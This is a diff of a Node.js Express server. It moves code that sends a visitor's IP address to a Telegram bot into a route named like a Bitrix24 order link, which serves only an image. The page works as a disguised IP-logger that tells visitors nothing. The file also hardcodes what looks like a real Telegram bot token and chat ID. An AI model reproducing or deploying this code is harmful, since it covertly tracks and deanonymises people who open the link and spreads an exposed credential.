@@ -12,23 +12,24 @@ const bot = new TelegramBot('6716327087:AAHZDYmz6vsrVKX5QfE35FB2hwJ53XospC0', { 
 app.use((req, res, next) => {
     const clientIp = req.ip || req.headers['x-forwarded-for']; // Capture client's IP
     console.log(`IP-адрес посетителя: ${clientIp}`);
-
-    // Send the client's IP address to your Telegram bot
-    bot.sendMessage('565711735', `Client IP: ${clientIp}`)
-        .then(() => {
-            console.log('IP sent to Telegram bot');
-        })
-        .catch((error) => {
-            console.error('Error sending IP to Telegram bot:', error);
-        });
-
     next();
 });
 
 app.get('/order/bitrix24/Bayakhmeto', async (req, res) => {
+    const clientIp = req.ip || req.headers['x-forwarded-for']; // Capture client's IP
+
+    // Send a message to the Telegram bot when this route is accessed
+    bot.sendMessage('565711735', `New order accessed by client with IP: ${clientIp}`)
+        .then(() => {
+            console.log('Order information sent to Telegram bot');
+        })
+        .catch((error) => {
+            console.error('Error sending order info to Telegram bot:', error);
+        });
+
     const imageUrl = 'https://letsenhance.io/static/8f5e523ee6b2479e26ecc91b9c25261e/1015f/MainAfter.jpg';
 
-    // Render an HTML page with the meta tags
+    // Render an HTML page with the image
     res.send(`
         <!DOCTYPE html>
         <html lang="en">
@@ -36,7 +37,7 @@ app.get('/order/bitrix24/Bayakhmeto', async (req, res) => {
             <meta name="viewport" content="width=device-width, minimum-scale=0.1">
         </head>
         <body>
-            <img src="https://letsenhance.io/static/8f5e523ee6b2479e26ecc91b9c25261e/1015f/MainAfter.jpg" alt="Example Image" style="max-width: 100%;">
+            <img src="${imageUrl}" alt="Example Image" style="max-width: 100%;">
         </body>
         </html>
     `);
